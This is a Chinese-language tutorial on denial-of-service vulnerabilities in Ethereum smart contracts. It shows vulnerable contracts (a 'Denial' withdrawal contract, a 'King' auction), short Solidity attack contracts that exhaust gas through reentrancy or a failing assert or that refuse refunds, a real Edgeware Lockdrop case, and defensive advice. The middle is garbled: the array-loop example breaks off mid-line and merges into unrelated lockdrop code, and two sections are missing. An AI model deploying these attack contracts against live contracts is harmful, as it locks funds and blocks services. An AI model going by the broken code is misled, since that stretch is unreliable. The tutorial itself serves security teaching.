# 0x01 前言
拒绝服务漏洞，简称DOS，是一种旨在破坏正常的服务，使得服务中断或者暂停，导致用户无法访问或者使用服务
同时在智能合约中也可能存在拒绝服务漏洞，使得发生锁币，无法正常竞拍等等现象发生，从而带来恶劣的影响。
# 0x02 预备知识
本部分简略介绍应该掌握的知识点
  * Send,Transfer
  * Call,Delegatecall,Callcode
  * 函数修饰关键词
  * Require,Revert
  * 合约继承
  * 数组和映射
  * gas费率
# 0x03 已知漏洞类型
本部分将归纳出现的拒绝服务漏洞类型
  1. 未设定gas费率的外部调用
  2. 依赖外部的调用进展
  3. owner错误操作
  4. 数组或映射过长
  5. 逻辑设计错误
  6. 缺少依赖库
下面将结合简单的示例或真实存在的受害合约进行分析
# 0x04 未设定gas费率的外部调用
在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import '@openzeppelin/contracts/math/SafeMath.sol';
    contract Denial {
        using SafeMath for uint256;
        address public partner; // withdrawal partner - pay the gas, split the withdraw
        address payable public constant owner = address(0xA9E);
        uint timeLastWithdrawn;
        mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
        function setWithdrawPartner(address _partner) public {
            partner = _partner;
        }
        // withdraw 1% to recipient and 1% to owner
        function withdraw() public {
            uint amountToSend = address(this).balance.div(100);
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            partner.call.value(amountToSend)("");
            owner.transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = now;
            withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
        }
        // allow deposit of funds
        fallback() external payable {}
        // convenience function
        function contractBalance() public view returns (uint) {
            return address(this).balance;
        }
    }
从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner
自然收不到钱了，从而造成DOS。
    contract Attack{
        address instance_address = instance_address_here;
        Denial target = Denial(instance_address);
        function hack() public {
            target.setWithdrawPartner(address(this));
            target.withdraw();
        }
        function () payable public {
            target.withdraw();
        } 
    }
或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了
    contract Attack{
        address instance_address = instance_address_here;
        Denial target = Denial(instance_address);
        function hack() public {
            target.setWithdrawPartner(address(this));
            target.withdraw();
        }
        function () payable public {
            assert(0==1);
        }
    }
# 0x05 依赖外部的调用进展
这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract King {
      address payable king;
      uint public prize;
      address payable public owner;
      constructor() public payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
      }
      fallback() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
      }
      function _king() public view returns (address payable) {
        return king;
      }
    }
谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持
king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King
    pragma solidity ^0.4.18;
    contract Attacker{
        constructor(address target) public payable{
            target.call.gas(1000000).value(msg.value)();
        }
    }
    //未定义fallback函数，就没有payable修饰
# 0x06 owner错误操作
本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。
    pragma solidity ^0.4.24;
    contract error{
        address owner;
        bool activestatus;
        modifier onlyowner{
            require(msg.sender==owner);
            _;
        }
        modifier active{
            require(activestatus);
            _;
        }
        function activecontract() onlyowner{
            activestatus = true;
        }
        function inactivecontract() onlyowner{
            activestatus = false;
        }
        function transfer() active{
        }
    }
如果owner调用了inactivecontract函数，使得activestatus变成false
之后所有被active修饰的函数都无法调用，无法通过require判定
令牌生态系统的整个操作取决于一个地址，这是非常危险的
# 0x07 数组或映射过长
本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红
    contract DistributeTokens {
        address public owner; // gets set somewhere
        address[] investors; // array of investors
        uint[] investorTokens; // the amount of tokens each investor gets
        // ... extra functionality, including transfertoken()
        function invest() public payable {
            investors.push(msg.sender);
            investorTokens.push(msg.value * 5); // 5 times the wei sent
            }
        function distribute() public {
            require(msg.sender == owner); // only owner
            for(uint i = 0; i = msg.value);
            emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);
        }
    assert(address(lockAddr).balance >= msg.value);
​ 这段代码做了强制判断：属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的
Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。
但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value”
攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock
合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益
# 0x0a 防御措施
  * 未设定gas费率的外部调用
使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。
  * 依赖外部的调用进展
在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。
  * owner错误操作
建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。
  * 数组或映射过长
避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。
  * 依赖库问题
继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。
  * 逻辑设计错误
合约正式上链之前一定要进行审计，避免未知的情况发生。特别是判断条件，慎之又慎。之前的有一个案例
        require(msg.sender==owner);
    require(msg.sender!=owner);
本应该是上面的写法却写成了下面的代码。